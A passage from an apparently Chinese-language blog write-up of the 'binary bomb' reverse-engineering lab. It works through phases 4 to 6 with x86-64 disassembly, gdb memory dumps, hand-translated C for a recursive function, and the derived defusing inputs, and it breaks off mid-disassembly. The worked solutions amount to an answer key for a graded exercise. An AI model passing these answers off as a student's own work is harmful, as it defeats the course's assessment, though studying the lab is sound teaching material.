class="line">0x402480:0x00400f830x000000000x00400f8a0x00000000</span><br><span class="line">0x402490:0x00400f910x000000000x00400f980x00000000</span><br><span class="line">0x4024a0:0x00400f9f0x000000000x00400fa60x00000000</span><br></pre></td></tr></table></figure><p>于是我们就可以找到正确的对应关系，这次没错了！</p><table><thead><tr><th>a</th><th>b</th></tr></thead><tbody><tr><td>0</td><td>0xcf</td></tr><tr><td>1</td><td>0x137</td></tr><tr><td>2</td><td>0x2c3</td></tr><tr><td>3</td><td>0x100</td></tr><tr><td>4</td><td>0x185</td></tr><tr><td>5</td><td>0xce</td></tr><tr><td>6</td><td>0x2aa</td></tr><tr><td>7</td><td>0x147</td></tr></tbody></table><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p>进入了紧张的中场阶段！<del>我好像掌握了作者的思路!</del></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:48 83 ec 18          sub    $0x18,%rsp</span><br><span class="line">  401010:48 8d 4c 24 0c       lea    0xc(%rsp),%rcx</span><br><span class="line">  401015:48 8d 54 24 08       lea    0x8(%rsp),%rdx</span><br><span class="line">  40101a:be cf 25 40 00       mov    $0x4025cf,%esi</span><br><span class="line">  40101f:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401024:e8 c7 fb ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  401029:83 f8 02             cmp    $0x2,%eax</span><br><span class="line">  40102c:75 07                jne    401035 &lt;phase_4+0x29&gt;</span><br><span class="line">  40102e:83 7c 24 08 0e       cmpl   $0xe,0x8(%rsp)</span><br><span class="line">  401033:76 05                jbe    40103a &lt;phase_4+0x2e&gt;</span><br><span class="line">  401035:e8 00 04 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:ba 0e 00 00 00       mov    $0xe,%edx</span><br><span class="line">  40103f:be 00 00 00 00       mov    $0x0,%esi</span><br><span class="line">  401044:8b 7c 24 08          mov    0x8(%rsp),%edi</span><br><span class="line">  401048:e8 81 ff ff ff       callq  400fce &lt;func4&gt;</span><br><span class="line">  40104d:85 c0                test   %eax,%eax</span><br><span class="line">  40104f:75 07                jne    401058 &lt;phase_4+0x4c&gt;</span><br><span class="line">  401051:83 7c 24 0c 00       cmpl   $0x0,0xc(%rsp)</span><br><span class="line">  401056:74 05                je     40105d &lt;phase_4+0x51&gt;</span><br><span class="line">  401058:e8 dd 03 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40105d:48 83 c4 18          add    $0x18,%rsp</span><br><span class="line">  401061:c3                   retq</span><br></pre></td></tr></table></figure><p>还是熟悉的配方!还是熟悉的参数!不过这里多了个func4,仔细观察func4的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400fd2:89 d0                mov    %edx,%eax</span><br><span class="line">  400fd4:29 f0                sub    %esi,%eax</span><br><span class="line">  400fd6:89 c1                mov    %eax,%ecx</span><br><span class="line">  400fd8:c1 e9 1f             shr    $0x1f,%ecx</span><br><span class="line">  400fdb:01 c8                add    %ecx,%eax</span><br><span class="line">  400fdd:d1 f8                sar    %eax</span><br><span class="line">  400fdf:8d 0c 30             lea    (%rax,%rsi,1),%ecx</span><br><span class="line">  400fe2:39 f9                cmp    %edi,%ecx</span><br><span class="line">  400fe4:7e 0c                jle    400ff2 &lt;func4+0x24&gt;</span><br><span class="line">  400fe6:8d 51 ff             lea    -0x1(%rcx),%edx</span><br><span class="line">  400fe9:e8 e0 ff ff ff       callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:01 c0                add    %eax,%eax</span><br><span class="line">  400ff0:eb 15                jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ff2:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  400ff7:39 f9                cmp    %edi,%ecx</span><br><span class="line">  400ff9:7d 0c                jge    401007 &lt;func4+0x39&gt;</span><br><span class="line">  400ffb:8d 71 01             lea    0x1(%rcx),%esi</span><br><span class="line">  400ffe:e8 cb ff ff ff       callq  400fce &lt;func4&gt;</span><br><span class="line">  401003:8d 44 00 01          lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  401007:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  40100b:c3                   retq</span><br></pre></td></tr></table></figure><p>emmm有一点麻烦了，这好像还是递归的。因为已经知道这玩意儿有三个参数，所以尝试将他翻译成c语言代码，忽略前面调用部分，只考虑func4函数，有三个参数，分别在%rdi,%rsi,%rdx。然后分析这段函数，发现并没有保存和弹出，猜测应该是引用传参，于是写出c代码(注意sar %eax这个指令，猜测是右移一位省略了$1这个参数)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> &amp;a,<span class="keyword">int</span> &amp;b,<span class="keyword">int</span> &amp;c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> x=c-b;</span><br><span class="line">  <span class="keyword">if</span>(x&lt;<span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    x=(x+<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  x=x/<span class="number">2</span>;</span><br><span class="line">  <span class="keyword">int</span> y=x+b;</span><br><span class="line">  <span class="keyword">if</span>(y&lt;=a)</span><br><span class="line">  &#123;</span><br><span class="line">    x=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(y&gt;=a)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> x;</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      b=y+<span class="number">1</span>;</span><br><span class="line">      func4(a,b,c);</span><br><span class="line">      x=<span class="number">2</span>*x+<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    c=y<span class="number">-1</span>;</span><br><span class="line">    func4(a,b,c);</span><br><span class="line">    x=<span class="number">2</span>*x;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接翻译过来很难理解，做一点简单的变动，让他变得更好理解一些，事实上上面的代码等价于下面的代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> &amp;a,<span class="keyword">int</span> &amp;b,<span class="keyword">int</span> &amp;c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> x;</span><br><span class="line">  <span class="keyword">if</span>(c-b&lt;<span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    x=(c-b+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    x=(c-b)/<span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> y=x+b;</span><br><span class="line">  <span class="keyword">if</span>(y==a)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(y&lt;a)</span><br><span class="line">  &#123;</span><br><span class="line">    b=y+<span class="number">1</span>;</span><br><span class="line">    func4(a,b,c);</span><br><span class="line">    x=<span class="number">2</span>*x+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;<span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    c=y<span class="number">-1</span>;</span><br><span class="line">    func4(a,b,c);</span><br><span class="line">    x=<span class="number">2</span>*x;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细分析上面代码的这个片段</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> x;</span><br><span class="line">  <span class="keyword">if</span>(c-b&lt;<span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    x=(c-b+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    x=(c-b)/<span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> y=x+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>猜测y的值应该是 $(b+c)/2$，那么上面这段代码可以这样理解，如果 $\frac{b+c}{2}=a$ 返回值为0，否则当 $\frac{b+c}{2}&lt;a$的时候让$b$加上1然后递归，返回值乘2倍加上1，否则就$b$减少1，返回值乘以2倍。<br>奇了怪了，这段代码到底在算些什么呢?但事实上我们不需要关心这段代码到底tmd在算啥，我们直接hack掉，找一组最直接的样例构造我们想要的结果即可！我们往回去看phase_4的代码，读入两个数ab，判断第一个数小于等于0xe，否则就爆掉，小于等于的话调用func4(0xe,0,a),然后判断返回值如果不为0，爆掉，否则看第二个数是否等于0，等于0顺利跳出。那么我们可以这样构造，先让$b=0$，再去考虑怎么让func4返回值为0，直接考虑$a=0xe/2$即可!测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That&apos;s number 2.  Keep going!</span><br><span class="line">0 207</span><br><span class="line">Halfway there!</span><br><span class="line">7 0</span><br><span class="line">So you got that one.  Try this one.</span><br></pre></td></tr></table></figure><p>通过!这个故事告诉我们，看不看得懂不重要，能构造出数据就行(逃</p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><p>熟练地找到对应的汇编代码，然后认真<del>xjr</del>分析一波</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">0000000000401062 &lt;phase_5&gt;:</span><br><span class="line">  401062:53                   push   %rbx</span><br><span class="line">  401063:48 83 ec 20          sub    $0x20,%rsp</span><br><span class="line">  401067:48 89 fb             mov    %rdi,%rbx</span><br><span class="line">  40106a:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax</span><br><span class="line">  401071:00 00</span><br><span class="line">  401073:48 89 44 24 18       mov    %rax,0x18(%rsp)</span><br><span class="line">  401078:31 c0                xor    %eax,%eax</span><br><span class="line">  40107a:e8 9c 02 00 00       callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:83 f8 06             cmp    $0x6,%eax</span><br><span class="line">  401082:74 4e                je     4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  401084:e8 b1 03 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401089:eb 47                jmp    4010d2 &lt;phase_5+0x70&gt;</span><br><span class="line">  40108b:0f b6 0c 03          movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">  40108f:88 0c 24             mov    %cl,(%rsp)</span><br><span class="line">  401092:48 8b 14 24          mov    (%rsp),%rdx</span><br><span class="line">  401096:83 e2 0f             and    $0xf,%edx</span><br><span class="line">  401099:0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">  4010a0:88 54 04 10          mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">  4010a4:48 83 c0 01          add    $0x1,%rax</span><br><span class="line">  4010a8:48 83 f8 06          cmp    $0x6,%rax</span><br><span class="line">  4010ac:75 dd                jne    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010ae:c6 44 24 16 00       movb   $0x0,0x16(%rsp)</span><br><span class="line">  4010b3:be 5e 24 40 00       mov    $0x40245e,%esi</span><br><span class="line">  4010b8:48 8d 7c 24 10       lea    0x10(%rsp),%rdi</span><br><span class="line">  4010bd:e8 76 02 00 00       callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:85 c0                test   %eax,%eax</span><br><span class="line">  4010c4:74 13                je     4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010c6:e8 6f 03 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4010d0:eb 07                jmp    4010d9 &lt;phase_5+0x77&gt;</span><br><span class="line">  4010d2:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  4010d7:eb b2                jmp    40108b &lt;phase_5+0x29&gt;</span><br><span class="line">  4010d9:48 8b 44 24 18       mov    0x18(%rsp),%rax</span><br><span class="line">  4010de:64 48 33 04 25 28 00 xor    %fs:0x28,%rax</span><br><span class="line">  4010e5:00 00</span><br><span class="line">  4010e7:74 05                je     4010ee &lt;phase_5+0x8c&gt;</span><br><span class="line">  4010e9:e8 42 fa ff ff       callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:48 83 c4 20          add    $0x20,%rsp</span><br><span class="line">  4010f2:5b                   pop    %rbx</span><br><span class="line">  4010f3:c3                   retq</span><br></pre></td></tr></table></figure><p>看一下结构，读一个串，判断长度是不是6，然后做一堆操作，然后movzbl $0x4024b0(%rdx)，看这个地址貌似是常量区，然后又做一堆操作，判断字符串是否相等。咦，那么猜测字符串应该在$0x4024b0附近，先gdb看一下，看到这样的结果,咦，怎么结果不对呢？那么让我们跳到strings_not_equal附近，找一下比较的是哪两个字符串。第一个参数是$0x10(%rsp)，第二个参数是$0x40245e,有了!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x40245e</span><br><span class="line">0x40245e:&quot;flyers&quot;</span><br></pre></td></tr></table></figure><p>刚好长度为6！，难道说….</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That&apos;s number 2.  Keep going!</span><br><span class="line">0 207</span><br><span class="line">Halfway there!</span><br><span class="line">7 0</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">flyers</span><br><span class="line"></span><br><span class="line">BOOM!!!</span><br><span class="line">The bomb has blown up.</span><br></pre></td></tr></table></figure><p>果不其然<del>怎么可能这么简单啊喂</del>，但是参数应该是没有错的，那么就是在读入的串上做了点手脚！我们现在去寻找读入的字符串和$0x10(%rsp)之间的联系!输入串abcdef进去看看断点打到0x4010b8(比较字符串之前)，看看这串内存到底tmd是啥东西,结果发现目标位置变成了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aduier</span><br></pre></td></tr></table></figure><p>至此我们大致明白了这一关的流程，读一个串，对串做改造，看看是否等于目标串，也就是说如果改造过程为$f(x)$，那么就是要求$f(x)=”flyers”$的$x$的值，也就是 $x=f^{-1}(“flyers”)$。那么就需要知道 $f^{-1}(x)$ 的具体情况！<br>仔细考察这个过程，先读入一个串，地址为%rdi,然后一波神奇的操作之后地址处第一个字符给了%ecx,然后我们注意到了这个过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">401099:0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:88 54 04 10          mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:48 83 c0 01          add    $0x1,%rax</span><br><span class="line">4010a8:48 83 f8 06          cmp    $0x6,%rax</span><br><span class="line">4010ac:75 dd                jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure><p>0x6!，做六次循环，处理过程应该就是在这里没错了!把0x4024b0(%rdx)间接寻址后的值给了相应的字符串位，%rdx又是什么呢？往上找找，发现了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">40108f:88 0c 24             mov    %cl,(%rsp)</span><br><span class="line">401092:48 8b 14 24          mov    (%rsp),%rdx</span><br><span class="line">401096:83 e2 0f             and    $0xf,%edx</span><br></pre></td></tr></table></figure><p>咦，%cx是读入的第一个字符，把第一个字符的低4位给了%rdx，高位全0，然后就到了最上面那一串寻址，这不就是switch case嘛，把整个循环部分贴出来更利于寻找答案.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">40108b:0f b6 0c 03          movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:88 0c 24             mov    %cl,(%rsp)</span><br><span class="line">401092:48 8b 14 24          mov    (%rsp),%rdx</span><br><span class="line">401096:83 e2 0f             and    $0xf,%edx</span><br><span class="line">401099:0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:88 54 04 10          mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:48 83 c0 01          add    $0x1,%rax</span><br><span class="line">4010a8:48 83 f8 06          cmp    $0x6,%rax</span><br><span class="line">4010ac:75 dd                jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure><p>上面这段代码循环6次，也就是说把6个字符的每个字符的ascii码低4位取出来，去做一次间接寻址，送到目的地。<br>那么我们去找找0x4024b0处到底都是些什么东西!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/s 0x4024b0</span><br><span class="line">0x4024b0 &lt;array.3449&gt;:&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span><br></pre></td></tr></table></figure><p>找到了!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maduiersnfotvbyl</span><br></pre></td></tr></table></figure><p>刚好16个字符,后面恰好是一段话！也就是说这16个字符就是对应的映射表！<br>| 序号 | 字符 |<br>| —- | —- |<br>| 0    | m    |<br>| 1    | a    |<br>| 2    | d    |<br>| 3    | u    |<br>| 4    | i    |<br>| 5    | e    |<br>| 6    | r    |<br>| 7    | s    |<br>| 8    | n    |<br>| 9    | f    |<br>| 10   | o    |<br>| 11   | t    |<br>| 12   | v    |<br>| 13   | b    |<br>| 14   | y    |<br>| 15   | l    |</p><p>为了拼凑出flyers,我们分别需要输入的字符串分别为序号9、15、14、5、 6、 7。显然结果不唯一1!那么我们就构造一组简单的结果，想到字符a的ascii码为97,而 $97&amp;0x1=1$，也就是说a的序号为1，然后在模16的情况下依次往后增加！显然，我们可以利用字符串”ionefg”来hack掉这个炸弹!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Good work!  On to the next...</span><br></pre></td></tr></table></figure><p>顺利拆弹!</p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><p>来到了除dlc以外的最后一关，这一关应该会有点难度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:41 56                push   %r14</span><br><span class="line">  4010f6:41 55                push   %r13</span><br><span class="line">  4010f8:41 54                push   %r12</span><br><span class="line">  4010fa:55                   push   %rbp</span><br><span class="line">  4010fb:53                   push   %rbx</span><br><span class="line">  4010fc:48 83 ec 50          sub    $0x50,%rsp</span><br><span class="line">  401100:49 89 e5             mov    %rsp,%r13</span><br><span class="line">  401103:48 89 e6             mov    %rsp,%rsi</span><br><span class="line">  401106:e8 51 03 00 00       callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">  40110b:49 89 e6             mov    %rsp,%r14</span><br><span class="line">  40110e:41 bc 00 00 00 00    mov    $0x0,%r12d</span><br><span class="line">  401114:4c 89 ed             mov    %r13,%rbp</span><br><span class="line">  401117:41 8b 45 00          mov    0x0(%r13),%eax</span><br><span class="line">  40111b:83 e8 01             sub    $0x1,%eax</span><br><span class="line">  40111e:83 f8 05             cmp    $0x5,%eax</span><br><span class="line">  401121:76 05                jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">  401123:e8 12 03 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401128:41 83 c4 01          add    $0x1,%r12d</span><br><span class="line">  40112c:41 83 fc 06          cmp    $0x6,%r12d</span><br><span class="line">  401130:74 21                je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">  401132:44 89 e3             mov    %r12d,%ebx</span><br><span class="line">  401135:48 63 c3             movslq %ebx,%rax</span><br><span class="line">  401138:8b 04 84             mov    (%rsp,%rax,4),%eax</span><br><span class="line">  40113b:39 45 00             cmp    %eax,0x0(%rbp)</span><br><span class="line">  40113e:75 05                jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">  401140:e8 f5 02 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401145:83 c3 01             add    $0x1,%ebx</span><br><span class="line">  401148:83 fb 05             cmp    $0x5,%ebx</span><br><span class="line">  40114b:7e e8                jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">  40114d:49 83 c5 04          add    $0x4,%r13</span><br><span class="line">  401151:eb c1                jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">  401153:48 8d 74 24 18       lea    0x18(%rsp),%rsi</span><br><span class="line">  401158:4c 89 f0             mov    %r14,%rax</span><br><span class="line">  40115b:b9 07 00 00 00       mov    $0x7,%ecx</span><br><span class="line">  401160:89 ca                mov    %ecx,%edx</span><br><span class="line">  401162:2b 10                sub    (%rax),%edx</span><br><span class="line">  401164:89 10                mov    %edx,(%rax)</span><br><span class="line">  401166:48 83 c0 04          add    $0x4,%rax</span><br><span class="line">  40116a:48 39 f0             cmp    %rsi,%rax</span><br><span class="line">  40116d:75 f1                jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line">  40116f:be 00 00 00 00       mov    $0x0,%esi</span><br><span class="line">  401174:eb 21                jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line">  401176:48 8b 52 08          mov    0x8(%rdx),%rdx</span><br><span class="line">  40117a:83 c0 01             add    $0x1,%eax</span><br><span class="line">  40117d:39 c8                cmp    %ecx,%eax</span><br><span class="line">  40117f:75 f5                jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  401181:eb 05                jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">  401183:ba d0 32 60 00       mov    $0x6032d0,%edx</span><br><span class="line">  401188:48 89 54 74 20       mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">  40118d:48 83 c6 04          add    $0x4,%rsi</span><br><span class="line">  401191:48 83 fe 